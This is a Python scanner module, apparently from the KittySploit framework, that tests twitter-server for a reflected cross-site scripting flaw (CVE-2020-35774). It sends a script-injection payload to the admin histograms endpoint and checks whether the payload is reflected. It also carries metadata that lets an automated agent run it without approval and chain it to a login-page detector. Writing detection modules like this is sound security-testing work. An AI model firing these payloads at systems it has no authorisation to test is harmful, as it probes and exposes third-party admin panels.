#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""twitter-server before 20."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'twitter-server Cross-Site Scripting Detection',
        'description': 'twitter-server before 20.12.0 is vulnerable to cross-site scripting in some configurations. The vulnerability exists in the administration panel of twitter-server in the histograms component via server/handler/HistogramQueryHandler.scala.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'xss', 'twitter-server', 'twitter', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://advisory.checkmarx.net/advisory/CX-2020-4287',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-35774',
            'https://github.com/twitter/twitter-server/commit/e0aeb87e89a6e6c711214ee2de0dd9f6e5f9cb6c',
            'https://github.com/twitter/twitter-server/compare/twitter-server-20.10.0...twitter-server-20.12.0',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2020-35774',
    }

    def run(self):
        r = self.http_request(method="GET", path='/admin/histograms?h=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&fmt=plot_cdf&log_scale=true', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        server = r.headers.get("Server") or r.headers.get("server") or ""
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="twitter-server Cross-Site Scripting detected",
                path='/admin/histograms?h=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&fmt=plot_cdf&log_scale=true',
            )
            return True
        return False

